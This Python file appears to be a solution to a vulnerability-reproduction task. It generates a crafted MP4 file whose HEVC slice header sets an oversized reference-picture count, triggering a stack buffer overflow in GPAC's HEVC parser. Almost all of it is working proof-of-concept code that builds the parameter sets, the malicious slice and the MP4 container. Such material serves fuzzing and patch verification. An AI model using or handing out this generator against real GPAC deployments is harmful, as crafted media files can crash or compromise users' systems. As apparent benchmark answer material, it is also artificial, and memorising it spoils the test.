import struct

class Solution:
    """
    Generates a Proof-of-Concept input for a Stack Buffer Overflow in GPAC's
    HEVC parser (oss-fuzz:42537907).

    The vulnerability lies in `gf_hevc_compute_ref_list()`, where the number of
    active reference pictures for a slice (`num_ref_idx_l0_active`) is read
    from the slice header without being validated against the maximum allowed
    size (`GF_HEVC_MAX_REF_PICS`, which is 16). This allows writing past the
    end of a stack-allocated array.

    The PoC is a minimal MP4 file containing an HEVC track. The track has one
    sample, a P-slice, whose header is crafted to trigger the bug:
    1. `num_ref_idx_active_override_flag` is set to 1.
    2. `num_ref_idx_l0_active_minus1` is set to 31.
    This results in `num_ref_idx_l0_active` becoming 32, which is greater
    than 16, causing the overflow.

    The MP4 structure and HEVC parameter sets (VPS, SPS, PPS) are programmatically
    generated to be minimal, ensuring a small PoC size.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.
        """

        class Bitstream:
            """A helper class to write HEVC bitstreams."""
            def __init__(self):
                self.bits = ""
            def write(self, value: int, num_bits: int):
                if num_bits > 0: self.bits += format(value, '0' + str(num_bits) + 'b')
            def write_ue(self, value: int):
                bits = bin(value + 1)[2:]
                self.bits += '0' * (len(bits) - 1) + bits
            def write_se(self, value: int):
                code = -2 * value if value <= 0 else 2 * value - 1
                self.write_ue(code)
            def get_rbsp(self) -> bytes:
                self.bits += '1'
                if len(self.bits) % 8 != 0: self.bits += '0' * (8 - len(self.bits) % 8)
                data = bytearray()
                for i in range(0, len(self.bits), 8): data.append(int(self.bits[i:i+8], 2))
                return bytes(data)

        def get_nal_unit(nal_type: int, rbsp: bytes) -> bytes:
            """Encapsulates RBSP data into a NAL unit with a header and emulation prevention."""
            nal_header = struct.pack('>H', (nal_type << 9) | 1) # temporal_id=1
            nal_payload = bytearray()
            zero_count = 0
            for byte in rbsp:
                if zero_count == 2 and byte <= 3:
                    nal_payload.append(3)
                    zero_count = 0
                zero_count = zero_count + 1 if byte == 0 else 0
                nal_payload.append(byte)
            return nal_header + bytes(nal_payload)

        # --- NAL Unit Generation ---

        # Minimal VPS (NAL type 32)
        vps_bs = Bitstream()
        vps_bs.write(0, 4); vps_bs.write(3, 2); vps_bs.write(0, 6); vps_bs.write(0, 3)
        vps_bs.write(1, 1); vps_bs.write(0xFFFF, 16)
        vps_bs.write(0, 2); vps_bs.write(1, 5); vps_bs.write(0, 32); vps_bs.write(0, 48)
        vps_bs.write(30, 8); vps_bs.write(0, 1)
        vps_bs.write_ue(0); vps_bs.write_ue(0); vps_bs.write_ue(0)
        vps_bs.write(0, 6); vps_bs.write(0, 1)
        vps = get_nal_unit(32, vps_bs.get_rbsp())

        # Minimal SPS (NAL type 33)
        sps_bs = Bitstream()
        sps_bs.write(0, 4); sps_bs.write(0, 3); sps_bs.write(1, 1)
        sps_bs.write(0, 2); sps_bs.write(1, 5); sps_bs.write(0, 32); sps_bs.write(0, 48)
        sps_bs.write(30, 8)
        sps_bs.write_ue(0); sps_bs.write_ue(1); sps_bs.write(0, 1)
        sps_bs.write_ue(33); sps_bs.write_ue(33) # width, height
        sps_bs.write(0, 1); sps_bs.write_ue(4)
        sps_bs.write(1, 1); sps_bs.write_ue(0); sps_bs.write_ue(0); sps_bs.write_ue(0)
        sps_bs.write_ue(0); sps_bs.write_ue(2); sps_bs.write_ue(0); sps_bs.write_ue(2)
        sps_bs.write_ue(0); sps_bs.write_ue(0); sps_bs.write(0, 1); sps_bs.write(1, 1)
        sps_bs.write(0, 1); sps_bs.write(0, 1); sps_bs.write(0, 1)
        sps_bs.write(0, 1) # short_term_ref_pic_set_sps_flag = 0
        sps_bs.write(0, 1); sps_bs.write(1, 1); sps_bs.write(0, 1)
        sps_bs.write(0, 1); sps_bs.write(0, 1)
        sps = get_nal_unit(33, sps_bs.get_rbsp())

        # Minimal PPS (NAL type 34)
        pps_bs = Bitstream()
        pps_bs.write_ue(0); pps_bs.write_ue(0); pps_bs.write(0, 1); pps_bs.write(0, 1)
        pps_bs.write(0, 3); pps_bs.write(0, 1); pps_bs.write(0, 1)
        pps_bs.write_ue(0); pps_bs.write_ue(0); pps_bs.write_se(0)
        pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write(1, 1)
        pps_bs.write_ue(0); pps_bs.write_se(0); pps_bs.write_se(0)
        pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write(0, 1)
        pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write(0, 1)
        pps_bs.write(0, 1); pps_bs.write(0, 1); pps_bs.write_ue(0)
        pps_bs.write(0, 1); pps_bs.write(0, 1)
        pps = get_nal_unit(34, pps_bs.get_rbsp())

        # Malicious Slice (NAL type 1, TRAIL_N)
        slice_bs = Bitstream()
        slice_bs.write(1, 1); slice_bs.write(0, 1); slice_bs.write_ue(0)
        slice_bs.write(0, 2) # slice_segment_address
        slice_bs.write_ue(1) # slice_type (P_SLICE)
        slice_bs.write(0, 1); slice_bs.write(0, 8) # pic_output_flag, slice_pic_order_cnt_lsb
        slice_bs.write(0, 1) # short_term_ref_pic_set_sps_flag
        slice_bs.write(0, 1); slice_bs.write_ue(1); slice_bs.write_ue(0) # ST-RPS
        slice_bs.write_ue(0); slice_bs.write(1, 1)
        slice_bs.write(0, 1)
        # VULNERABILITY TRIGGER
        slice_bs.write(1, 1)   # num_ref_idx_active_override_flag
        slice_bs.write_ue(31)  # num_ref_idx_l0_active_minus1 (results in 32 > 16)
        slice_bs.write(0, 1); slice_bs.write(0, 1); slice_bs.write_se(0); slice_bs.write(0, 1)
        slice_data = get_nal_unit(1, slice_bs.get_rbsp())
        
        # --- MP4 Container Generation ---
        def make_box(box_type: bytes, content: bytes) -> bytes:
            return struct.pack('>I', len(content) + 8) + box_type + content

        ftyp = make_box(b'ftyp', b'isom\x00\x00\x00\x01iso2mp41')

        hvcc_content = b'\x01\x01\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' \
                     + b'\xf0\x00\xfc\xfd' \
                     + b'\x03' \
                     + b'\xa0' + struct.pack('>HH', 1, len(vps)) + vps \
                     + b'\xa1' + struct.pack('>HH', 1, len(sps)) + sps \
                     + b'\xa2' + struct.pack('>HH', 1, len(pps)) + pps
        
        hvc1 = b'\x00\x00\x00\x00\x00\x00\x00\x01' + b'\x00' * 16 \
             + struct.pack('>HH', 33, 33) \
             + b'\x00\x48\x00\x00\x00\x48\x00\x00' \
             + b'\x00\x00\x00\x00\x00\x01' \
             + b'\x00' * 32 + b'\x00\x18\xff\xff' \
             + make_box(b'hvcC', hvcc_content)

        stsd = b'\x00\x00\x00\x00\x00\x00\x00\x01' + make_box(b'hvc1', hvc1)
        stts = b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x03\xe8'
        stsc = b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01'
        stsz = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(slice_data))
        stco_placeholder = make_box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01\xDE\xAD\xBE\xEF')

        stbl = make_box(b'stsd', stsd) + make_box(b'stts', stts) + make_box(b'stsc', stsc) \
             + make_box(b'stsz', stsz) + stco_placeholder
        
        vmhd = make_box(b'vmhd', b'\x00\x00\x00\x01' + b'\x00' * 8)
        dinf = make_box(b'dinf', make_box(b'dref', b'\x00\x00\x00\x00\x00\x00\x00\x01' + make_box(b'url ', b'\x00\x00\x00\x01')))
        minf = make_box(b'minf', vmhd + dinf + stbl)
        hdlr = make_box(b'hdlr', b'\x00\x00\x00\x00\x00\x00\x00\x00' + b'vide' + b'\x00' * 12 + b'VideoHandler\x00')
        mdhd = make_box(b'mdhd', b'\x00\x00\x00\x00' * 3 + struct.pack('>II', 1000, 1000) + b'\x15\xc7\x00\x00')
        mdia = make_box(b'mdia', mdhd + hdlr + minf)
        tkhd = make_box(b'tkhd', b'\x00\x00\x00\x07' + b'\x00' * 8 + b'\x00\x00\x00\x01' + b'\x00' * 12 +
               (b'\x00\x01\x00\x00' * 2 + b'\x00' * 4) * 2 + b'\x40\x00\x00\x00' +
               b'\x00' * 12 + struct.pack('>HH', 33, 33) + b'\x00\x00')
        trak = make_box(b'trak', tkhd + mdia)
        mvhd = make_box(b'mvhd', b'\x00\x00\x00\x00' * 3 + struct.pack('>II', 1000, 1000) +
               b'\x00\x01\x00\x00' + b'\x01\x00' + b'\x00' * 10 +
               (b'\x00\x01\x00\x00' + b'\x00' * 12) * 2 + b'\x40\x00\x00\x00' + b'\x00' * 24 + b'\x00\x00\x00\x02')
        moov = make_box(b'moov', mvhd + trak)
        
        mdat = make_box(b'mdat', slice_data)
        
        stco_offset = len(ftyp) + len(moov) + 8 # +8 for mdat header
        stco_new = make_box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', stco_offset))
        
        return ftyp + moov.replace(stco_placeholder, stco_new) + mdat